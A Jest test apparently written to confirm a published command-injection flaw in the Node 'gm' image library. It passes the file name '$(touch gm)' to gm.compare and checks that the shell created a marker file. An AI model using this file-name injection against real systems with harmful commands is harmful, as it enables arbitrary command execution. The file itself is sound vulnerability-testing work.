const { doesNotMatch } = require("assert");

//https://github.com/advisories/GHSA-pjh3-jv7w-9jpr
test("Command Injection in gm", (done) => {
  expect.assertions(2);
  const gm = require("gm");
  const fs = require("fs");
  const path = "./gm";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      // console.log('File removed:', path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  gm.compare("$(touch gm)", "/path/to/another.png", function (
    err,
    isEqual,
    equality,
    raw,
    path1,
    path2
  ) {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
